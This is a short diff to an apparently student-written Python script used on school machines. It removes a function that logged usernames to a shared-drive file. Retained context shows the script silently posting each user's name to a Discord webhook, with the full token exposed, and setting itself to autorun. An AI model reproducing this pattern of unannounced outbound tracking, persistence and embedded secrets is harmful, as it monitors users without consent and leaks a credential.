@@ -48,11 +48,6 @@ def vsc() -> None:
                   getuser()}\vsc\code';$s.Save()"''')
 
 
-def name_list() -> None:
-    if not getuser() in File('Y:/2BHIT/moritz/users.txt').read(True):
-        File('Y:/2BHIT/moritz/users.txt').append(getuser(), True)
-
-
 def log() -> None:
     Webhook(
         'https://discord.com/api/webhooks/1333368102817104024/p1_gzb1zV3CVYyrjKce2GgkH5pYAnKDRS8pn4NXsOzvQ9ciFyoEywpr5AwUUV89vMV31', getuser)
@@ -67,7 +62,6 @@ def autorun() -> None:
 log()
 vsc()
 check_sth_sc()
-name_list()
 write_install()
 autorun()
 
